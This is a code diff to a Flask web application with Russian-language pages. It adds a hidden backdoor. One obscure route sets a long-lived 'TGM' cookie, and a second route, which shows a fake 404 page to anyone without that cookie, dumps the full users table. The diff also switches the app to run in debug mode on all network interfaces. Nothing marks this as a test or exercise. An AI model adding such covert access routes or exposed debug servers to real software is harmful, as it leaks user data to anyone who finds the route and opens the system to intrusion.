@@ -131,8 +131,30 @@ def special_page():
                                              **{'p_title': 'Мои заявки', 'users': users}))
     return response
 
+@app.route('/hello_world_set_super_puper_user_for_my_db', methods=['GET'])
+def set_admin():
+    response = make_response(render_template('set_god_mode.html', **{'p_title': 'Служебная страница'}))
+    response.set_cookie('TGM', 'WR', max_age=60*60*24*31*12)
+    return response
 
+@app.route('/super_user_toor_root', methods=['GET'])
+def admin_page():
+    if request.cookies.get('TGM'):
+        conn = sqlite3.connect(db_name)
+        cursor = conn.cursor()
+        cursor.execute('''SELECT * FROM users_mk''')
+        users = cursor.fetchall()
+        conn.close()
+        response = make_response(render_template('all_users_data.html', **{'p_title': 'Администратор - БД',
+                                                                           'users': users}))
+        return response
+    else:
+        return render_template('404.html'), 404
+
+@app.errorhandler(404)
+def not_found_error(error):
+    return render_template('404.html'), 404
 
 if __name__ == '__main__':
     logging.basicConfig(level=logging.DEBUG)
-    app.run(debug=True, port=5000)
+    app.run(debug=True, port=5000, host='0.0.0.0')
